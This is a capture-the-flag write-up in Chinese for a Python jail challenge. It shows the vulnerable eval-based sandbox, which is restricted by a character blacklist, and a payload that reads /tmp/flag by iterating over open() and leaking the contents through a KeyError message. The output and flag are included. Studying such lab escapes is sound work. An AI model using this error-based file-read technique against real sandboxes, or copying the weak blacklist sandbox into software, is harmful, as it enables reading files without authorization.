# [only_open](https://ctf.xidian.edu.cn/games/37/challenges?challenge=1300)
##### 分值：150pts

## 题目描述：
### 原文：
starwalking，你别躲在里面不出声，我知道你在open，你有本事open，怎么没本事read哪。read呐，你有本事open，你有本事read呐，read，read，快read，starwalking快read，别躲里面不出声，我知道你在open。

友情提示: flag在/tmp/flag


## 分析：
### pyjail

## 解题步骤：
查看源码：
```python

def chall():
    safe_globals={
        'open':open,
        '__builtins__' : {}
    }

    blacklist = ['_','.','\\']
    while True:
        try:
            message = input('Give me your code: ').encode('ascii').decode('ascii')
            if any(b in blacklist for b in message):
                raise RuntimeError('Can\'t input any characters in blacklist')
            eval(message,safe_globals)
        except Exception as e:
            print(f'{type(e).__name__} : {e}')

```
可见：`_ . \`被过滤，所以不能通过`.`获取`object`的`subclasses`，所以只能利用已有的`open`。
注意到`print`只有在下方的error，故应该触发error，而让flag出现在error里。

构造payload：
```python
{}['%s' % [x for x in open('/tmp/flag')]]
```
解释：因为open返回的文件对象有实现迭代器，所以可以使用`for in`读取内容（不需要显式调用`read`）；
使用`'%s' % obj`，将刚刚使用for in创建的数组转成字符串；然后用最终的数组字符串（包含了文件内容）作为key去访问`{}`，因为是空的，所以该key一定不存在，所以会出错，而错误信息包含了该不存在的`key`。

```log
Are you robot? Please enter 'W7YN02'+'LBJCQX'=? to continue: W7YN02LBJCQX
Give me your code: {}['%s' % [x for x in open('/tmp/flag')]]
KeyError : "['moectf{ad80825e-5f66-929c-e28b-74427a8a59ab}\\n']"
Give me your code: % 
```


## Flag
moectf{ad80825e-5f66-929c-e28b-74427a8a59ab}